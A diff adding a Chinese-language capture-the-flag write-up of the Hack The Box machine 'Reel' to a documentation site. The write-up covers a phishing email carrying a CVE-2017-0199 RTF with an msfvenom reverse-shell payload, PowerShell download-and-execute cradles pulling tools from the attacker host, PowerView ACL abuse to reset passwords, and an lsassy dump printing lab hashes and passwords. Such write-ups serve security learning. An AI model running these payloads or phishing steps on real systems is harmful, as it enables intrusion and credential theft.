@@ -989,6 +989,60 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#shell-as-user-nico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - nico
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-tom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - Tom
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-claire" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - claire
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as Root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dump-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump Hash
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1052,6 +1106,27 @@
   
   <span class="md-ellipsis">
     Sauna
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sizzle/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sizzle
   </span>
   
 
@@ -1441,9 +1516,161 @@ Host<span class="w"> </span>script<span class="w"> </span>results:
 <img alt="" src="../assets/Pasted%20image%2020240115172622.png" /></p>
 </blockquote>
 <ul>
-<li>ftp 发现多个文件
-<img alt="" src="../assets/Pasted%20image%2020240115173218.png" /></li>
+<li>
+<p>ftp 发现多个文件
+<img alt="" src="../assets/Pasted%20image%2020240115173218.png" /></p>
+</li>
+<li>
+<p>查看文件，发现一个邮箱地址和一个提示</p>
+</li>
 </ul>
+<p><img alt="image-20240117092825808" src="../assets/image-20240117092825808.png" /></p>
+<p>目标接收邮件会自动转换 <code>rft</code> 文件，发现漏洞 <code>CVE-2017-0199</code></p>
+<p><img alt="image-20240117093045330" src="../assets/image-20240117093045330.png" /></p>
+<h2 id="shell-as-user-nico">Shell as User - nico</h2>
+<ul>
+<li>生成 Payload</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.16.18<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">2233</span><span class="w"> </span>-f<span class="w"> </span>hta-psh<span class="w"> </span>-o<span class="w"> </span>good.hta
+python2<span class="w"> </span><span class="m">41894</span>.py<span class="w"> </span>-M<span class="w"> </span>gen<span class="w"> </span>-t<span class="w"> </span>RTF<span class="w"> </span>-w<span class="w"> </span>good.rtf<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://10.10.16.18/good.hta&quot;</span>
+</code></pre></div>
+<ul>
+<li>发送邮件</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>sendemail<span class="w"> </span>-f<span class="w"> </span>good@megabank.com<span class="w"> </span>-t<span class="w"> </span>nico@megabank.com<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;It&#39;s very good&quot;</span><span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;How are you, nico boy.&quot;</span><span class="w"> </span>-a<span class="w"> </span>good.rtf<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.10.10.77<span class="w"> </span>-v
+</code></pre></div>
+<ul>
+<li>接收 Reverse Shell</li>
+</ul>
+<p><img alt="image-20240117100329616" src="../assets/image-20240117100329616.png" /></p>
+<h2 id="shell-as-user-tom">Shell as User - Tom</h2>
+<ul>
+<li>在桌面上发现 <code>cred.xml</code></li>
+</ul>
+<p><img alt="image-20240117101140259" src="../assets/image-20240117101140259.png" /></p>
+<ul>
+<li>尝试恢复密码 <code>powershell -c "$Cred = Import-Clixml -Path cred.xml; $Cred.GetNetworkCredential().Password"</code></li>
+</ul>
+<p><img alt="image-20240117102250991" src="../assets/image-20240117102250991.png" /></p>
+<ul>
+<li>
+<p>ssh 登录 <code>HTB\Tom:1ts-mag1c!!!</code></p>
+</li>
+<li>
+<p>查看 smb 共享</p>
+</li>
+</ul>
+<p><img alt="image-20240117104946257" src="../assets/image-20240117104946257.png" /></p>
+<p>但是没有发现有用的信息</p>
+<ul>
+<li>跑一下 WinPEAS，遛一下狗</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="o">[</span>kali<span class="o">]</span><span class="w"> </span>$<span class="w"> </span>impacket-smbserver<span class="w"> </span>good<span class="w"> </span>.
+<span class="o">[</span>tom<span class="o">]</span><span class="w"> </span>c:<span class="se">\&gt;</span><span class="w"> </span>copy<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.10.16.18<span class="se">\g</span>ood<span class="se">\w</span>inPEASx64.exe<span class="w"> </span>winPEASx64.exe
+<span class="o">[</span>tom<span class="o">]</span><span class="w"> </span>c:<span class="se">\&gt;</span><span class="w"> </span>copy<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.10.16.18<span class="se">\g</span>ood<span class="se">\S</span>harpHound.exe<span class="w"> </span>SharpHound.exe
+</code></pre></div>
+<ul>
+<li>组策略限制，无法运行 exe，尝试远程加载 powershell</li>
+</ul>
+<p><img alt="image-20240117105928474" src="../assets/image-20240117105928474.png" /></p>
+<div class="language-shell highlight"><pre><span></span><code>powershell<span class="w"> </span><span class="s2">&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.18/winPEAS.ps1&#39;)&quot;</span>
+powershell<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.16.18/SharpHound.ps1&#39;);Invoke-BloodHound -CollectionMethod All&quot;</span>
+</code></pre></div>
+<ul>
+<li>SharpHound.ps1 运行失败</li>
+</ul>
+<p><img alt="image-20240117111957134" src="../assets/image-20240117111957134.png" /></p>
+<ul>
+<li>在 winPEAS 中发现 nico 用户的凭据 <code>HTB\nico:4dri@na2017!**</code></li>
+</ul>
+<p><img alt="image-20240117132331207" src="../assets/image-20240117132331207.png" /></p>
+<ul>
+<li>在 <code>C:\Users\tom\Desktop\</code> 发现有实现跑过的 bloodhound 记录</li>
+</ul>
+<p><img alt="image-20240117112148094" src="../assets/image-20240117112148094.png" /></p>
+<p>提示没有直接通往域控的路径，需要先横向移动，另外发现关于 acl 相关的文件</p>
+<ul>
+<li>本地有一个 Powerview 文件，可以利用</li>
+</ul>
+<p><img alt="image-20240117114029493" src="../assets/image-20240117114029493.png" /></p>
+<h2 id="shell-as-user">Shell as User</h2>
+<p>首先分析 acls.csv 文件，这是一个 Bloodhound 收集的信息，目前版本的 bloodhound 不兼容，导致导入失败，因此手动分析。</p>
+<ul>
+<li>首先筛选已有的用户</li>
+</ul>
+<p><img alt="image-20240117132854896" src="../assets/image-20240117132854896.png" /></p>
+<ul>
+<li>发现对 <code>herman@HTB.LOCAL、claire@HTB.LOCAL</code> 用户具有 WriteOwner 权限，可以接管这两个用户</li>
+</ul>
+<p><img alt="image-20240117133001673" src="../assets/image-20240117133001673.png" /></p>
+<ul>
+<li>继续再筛选添加这两个用户</li>
+</ul>
+<p><img alt="image-20240117133833011" src="../assets/image-20240117133833011.png" /></p>
+<p>对 <code>Backup_Adminis</code> 组具有 WriteDacl 权限，似乎是备份管理员组，现在尝试利用</p>
+<h2 id="shell-as-user-claire">Shell as User - claire</h2>
+<ol>
+<li>加载 PowerView</li>
+<li>设置 tom 为 claire ACL 的所有权限 </li>
+<li>获取 claire 重置密码的权限 </li>
+</ol>
+<div class="language-powershell highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Set-DomainObjectOwner</span> <span class="n">-identity</span> <span class="n">claire</span> <span class="n">-OwnerIdentity</span> <span class="n">tom</span> <span class="n">-Verbose</span>
+<span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="n">claire</span> <span class="n">-PrincipalIdentity</span> <span class="n">tom</span> <span class="n">-Rights</span> <span class="n">ResetPassword</span> <span class="n">-Verbose</span>
+</code></pre></div>
+<ul>
+<li>重置 claire 的密码</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="nv">$NewPass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span><span class="s1">&#39;Admin@123Admin@123&#39;</span><span class="w"> </span>-AsPlainText<span class="w"> </span>-Force<span class="w"> </span>-Verbose
+Set-DomainUserPassword<span class="w"> </span>-Identity<span class="w"> </span>claire<span class="w"> </span>-AccountPassword<span class="w"> </span><span class="nv">$NewPass</span><span class="w"> </span>-Verbose
+</code></pre></div>
+<p><img alt="image-20240117140218926" src="../assets/image-20240117140218926.png" /></p>
+<p>登录 claire 用户</p>
+<p><img alt="image-20240117140347447" src="../assets/image-20240117140347447.png" /></p>
+<ul>
+<li>查看用户组</li>
+</ul>
+<p><img alt="image-20240117140454473" src="../assets/image-20240117140454473.png" /></p>
+<p>由于 claire 用户对 Backup_Admins 组有 WriteDacl 权限，因此可以将自己添加至该用户组</p>
+<ul>
+<li>添加 claire 用户到 Backup_Admins 组 <code>net group Backup_Admins claire /add /domain</code></li>
+</ul>
+<p><img alt="image-20240117140648932" src="../assets/image-20240117140648932.png" /></p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<ul>
+<li>权限和组名不太对应</li>
+</ul>
+<p><img alt="image-20240117141912382" src="../assets/image-20240117141912382.png" /></p>
+<ul>
+<li>查看一下文件权限 <code>icacls c:\users\Administrator</code></li>
+</ul>
+<p><img alt="image-20240117141940062" src="../assets/image-20240117141940062.png" /></p>
+<p>可以访问 administrator 目录</p>
+<ul>
+<li>无法访问 root.txt 但是有个 <code>Backup Scripts</code> 目录</li>
+</ul>
+<p><img alt="image-20240117142033042" src="../assets/image-20240117142033042.png" /></p>
+<ul>
+<li>在 BackupScript.ps1 中发现管理员密码</li>
+</ul>
+<p><img alt="image-20240117142220993" src="../assets/image-20240117142220993.png" /></p>
+<ul>
+<li>登录 <code>Administrator:Cr4ckMeIfYouC4n!</code></li>
+</ul>
+<p><img alt="image-20240117142315217" src="../assets/image-20240117142315217.png" /></p>
+<h2 id="dump-hash">Dump Hash</h2>
+<ul>
+<li><code>lsassy HTB.LOCAL -u Administrator -p 'Cr4ckMeIfYouC4n!' -dc-ip $IP</code></li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB<span class="se">\t</span>om<span class="w">                  </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>494c49c3a53e33a778f647dafac797b3<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>9db10cb704876ac0df5eb34853cc54e353920152
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB<span class="se">\A</span>dministrator<span class="w">        </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>8b89333aa775584fdc5b5b0acdace063<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>58413d54bf1c8e5098e72fdfc4c8d47cc5775bc4
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB.LOCAL<span class="se">\A</span>dministrator<span class="w">  </span><span class="o">[</span>PWD<span class="o">]</span><span class="w"> </span>Cr4ckMeIfYouC4n!
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB<span class="se">\n</span>ico<span class="w">                 </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>cd88c7b4b819442a1e0ad041d4675aee<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>118f938e7dbe0b6c12ba16414c8f6fc67c29fb8c
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB<span class="se">\R</span>EEL$<span class="w">                </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>9fcf6992b154c8f754b5d569641fd52d<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>faaf23560d8898cb51fd3156e9a01d975a463083
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB.LOCAL<span class="se">\R</span>EEL$<span class="w">          </span><span class="o">[</span>PWD<span class="o">]</span><span class="w"> </span>4b2f092a476efe35edb1c4b2f4c10ff3f0ccb4ce3c47fa2dbc9524eea5f37a914bcca4e1a3d0d41dfc876da61dd13e967e9e57df9f5062720ecbd554e5434b9dc4923e306fb32553557656dd67d12ae076eb110568ba76afbeac049e5298fe5fa3393169390b1c7bc12ca38d2068b106f2ba21462519c99931788cce534ad7e0852a781832571581e20735f50a7b1a3cb94a8e1701bc612bd60961268cf6eb1a178f1c90fd2531a1f3576da60dcd96ed58e8c042f7ab7485091eaca966e562f8246a05ba0d3367318c20d5ec67d78dfb29ef3b033121307e80929d7997cff51fecd0d69e38b526f4389afe096351c1c9
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB<span class="se">\R</span>EEL$<span class="w">                </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>f32e4ac829de6d7a0da8afe4bf952ff0<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>3197f99d71c2698a1215e10bd95ed6f2f0e34f93
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTB.LOCAL<span class="w"> </span>HTB.LOCAL<span class="se">\R</span>EEL$<span class="w">          </span><span class="o">[</span>PWD<span class="o">]</span><span class="w"> </span>dd31f4d28dfb15fac136c658ae3eacebb033c17884a003e6a386f3b98fa84ee8ef3cc6582bd9debb32569db14cc9e3db022b6c35fa4070bc22af280e954e5dcf365604a1fcb86bc3c91c3773ccc76450622aa4a4bd7e245771f0886713cd512cc52bb386ef62c216ad1e620bd263fb5b0476a86e925ba0a8e82ddba782e32fb2c2cc7d4a2ed79d57b022ec5972af39c3b8c0dfc85e45e64696fa751bef46f4dceac1567475013aa5aa12a8a46ae1202040722877efe16e565745f27a7aa1ba5df6ff07a9357c4856c280b2fadc17f8590dd445e00d110059ee6c041dc512db901958dce70b23b99f05fd7ebb6205f8e4
+</code></pre></div>
 
 
 
